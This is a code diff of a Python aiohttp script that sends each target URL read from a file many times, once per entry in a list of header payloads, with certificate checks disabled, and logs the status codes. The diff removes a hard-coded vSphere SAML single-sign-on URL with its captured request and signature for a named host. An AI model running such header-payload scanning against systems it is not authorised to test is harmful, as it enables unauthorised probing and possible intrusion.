@@ -1271,38 +1271,42 @@ async def download_link(url:str,session:ClientSession):
         response = await response.text()
        #
     
-async def download_all(urls:list,hs,n:int,payload):
-    my_conn = aiohttp.TCPConnector(limit_per_host=50,verify_ssl=False)
+async def download_all(urls:list,hs,payload):
+    my_conn = aiohttp.TCPConnector(limit_per_host=20,verify_ssl=False)
    
     
-    async with aiohttp.ClientSession(connector=my_conn,headers=hs) as session:
+    async with aiohttp.ClientSession(connector=my_conn) as session:
         tasks = []
+        
         for url in urls:
             try:
-                async with session.get(url) as response:
+                
+                for head in range(len(headers_payload_lists)):
+                    
+                    async with session.get(url,headers=headers_payload_lists[head]) as response:
 
-                    if response.status == 200:
-                        pass
-                    else:
-                        print("Error")
+                        if response.status == 200:
+                           print(f'\033[91m Header:\033[00m [{headers_payload_lists[head]}] \033[91m Requst_Number:\033[00m [{head}] \033[00m URL:\033[91m [{url}]\033[00m RESPONSE_CODE:\033[91m[{response.status}]\033[00m ')
+
+                        else:
+                            print(f'\033[91m Header:\033[00m [{headers_payload_lists[head]}] \033[91m Requst_Number:\033[00m [{head}] \033[00m URL:\033[91m [{url}]\033[00m RESPONSE_CODE:\033[91m[{response.status}]\033[00m ')
+
             except aiohttp.ClientConnectorError as e:    
                           print('Connection Error', str(e))
 
             task = asyncio.ensure_future(download_link(url=url,session=session))
             tasks.append(task)
             
-            print(f'\033[91m Header:\033[00m [{hs}] \033[91m Requst_Number:\033[00m [{n}] \033[00m URL:\033[91m [{url}]\033[00m RESPONSE_CODE:\033[91m[{response.status}]\033[00m {payload}')
-        await asyncio.gather(*tasks,return_exceptions=True)
+            await asyncio.gather(*tasks,return_exceptions=True)
 urls = []
 with open ("urls.txt","rb") as file:
     for line in file:
         urls.append(line.strip().decode())
 
-url_list = ["https://vcsa.mizban.com/websso/SAML2/SSO/vsphere.local?SAMLRequest=zVTfb5swEP5XkN%2FBQMhKrZCqa1atUrtmJZumvUwXuDSWwGY%2BA%2Bn%2B%2BhmSbFG1Vn3cq7n77vslZhe7uvI6NCS1ylgUhMxDVehSqseMfVld%2Bym7mM8I6qoRl63dqgf82SJZz%2B0pEuOHjLVGCQ0kSSiokYQtRH55dyviIBSN0VYXumLeJREa6w5daUVtjSZH08kCb1SJu4y50wuHLBXYkczW2oYE511BENTy1xpUUOia97gm0nw4EPM8v%2BcdNVs0GFS6AHfmWpsCR64Z20BFyLybRcZ%2BpOvzzXSSvJukmwkk4VmKKZzFEEFcTs%2FP0sKN0RKIZId%2FF4lax48sKJuxOIwjP4r9aLqKUhHFIpkGyXT6nXnLg8j3Uu2te82R9X6IxMfVaukv7%2FPVCNDJEs0nN52xZ5JFkkyY9%2FWYksNgx0xGgubtacAxAzZ%2Fyd9W8gHo6HONFkqwMOOnF%2Ff340YMhG8WS13J4umERvz2VlSV7q8MgnXCrWlxTLAG%2BzrA8CJLfzOOimbwhiwqy7x8OXD63EIlNxLNy0V6QSjjB3HC9bSUg1l0quzNBj9HOYB0bmVPauBU9%2BCqO9ChYos1EAdrjT8C8ziMYh4m%2FMPOSRvCJ3YA2ZH8g9H3fdBPAm0e3UIY8W93t%2FmI5cuxuYWz1M0L%2B9QM3RoYP6DCHtYVrtzbPwT%2FR1QXWOHjKVX%2BPJz5sZqnP6j5bw%3D%3D&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=A%2BnKxQWHMnSNwyZ70XBEx8VV%2BKf5DuuZaMMKnYRfmPFufo5GwAOfM1mKZcYBXfxvAX9PJIuIv3VLtdX3s0h1Ru9cEZ0l3BBSvbQTAK0Ob6dcN9XhjTriG%2Be6z68aKHrxrNaPX5c%2FaSpK0Ckj87c%2BI3UZPeE9aIcoQFw%2BC%2FAKrdIwY3M6hnTsuMJWrEj4LiKW06CV5q9rmSiM8q4fQRCcGM%2B4bM9tdwlXZ09J3z9xzEk3qaLdZjejL83zpjWMAHq2uVC2LgaICcMSJG0rHQ9wWo5KvZfQfpf9JdsWI2NppGd7cpmIEo0zPr1d8c8dNcYrBV2KSseY13voFlfp%2Byg08A%3D%3D"]
-print(url_list)
+
 start = time.time()
-for head in range(len(headers_payload_lists)):
+
     
-    asyncio.run(download_all(url_list,headers_payload_lists[head],head,payload))
+asyncio.run(download_all(urls,headers_payload_lists,payload))
 end = time.time()
 print(f'Finshed in  \033[32m {end - start} \033[00m seconds , Total requests \033[32m{len(headers_payload_lists)}')
